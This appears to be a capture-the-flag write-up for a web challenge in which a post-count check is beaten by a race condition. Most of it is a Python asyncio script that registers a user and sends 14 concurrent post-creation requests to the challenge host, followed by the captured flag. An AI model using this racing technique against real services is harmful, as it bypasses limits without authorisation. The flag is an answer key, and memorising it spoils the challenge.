---
ai_date: 2025-04-27 05:14:12
ai_summary: Exploited SQL race condition to create multiple posts and retrieve the flag
ai_tags:
  - sql
  - race
  - rce
created: 2024-08-30T19:02
points: 175
solves: 86
updated: 2025-07-14T09:46
---

The remote uses SQL and checks post count at start.

We can just race condition that.

Spam new posts, requires a few tries to get through.

## solve

```python
import random
import aiohttp
import asyncio

target = "http://1eccef74-79bb-4894-8360-440f545b2f50.bugg.cc"


async def post(session, url, data):
    async with session.post(url, json=data) as response:
        return await response.text()


async def get(session, url):
    async with session.get(url) as response:
        return await response.text()


async def main():
    username = "u"+str(random.randint(0, 100000))
    print(username)
    async with aiohttp.ClientSession() as session:
        await post(session, target+"/register", {"username": username, "password": "pass"})
        await post(session, target+"/login", {"username": username, "password": "pass"})

        coroutines = [post(session, target+"/user/posts/create", {"data": "w", "title": "random"}) for _ in range(14)]
        responses = await asyncio.gather(*coroutines)
        for response in responses:
            print(response)

        print(await get(session, target+"/user/flag"))

if __name__ == '__main__':
    asyncio.run(main())
```

```flag
CSCTF{d2426fb5-a93a-4cf2-b353-eac8e0e9cf94}
```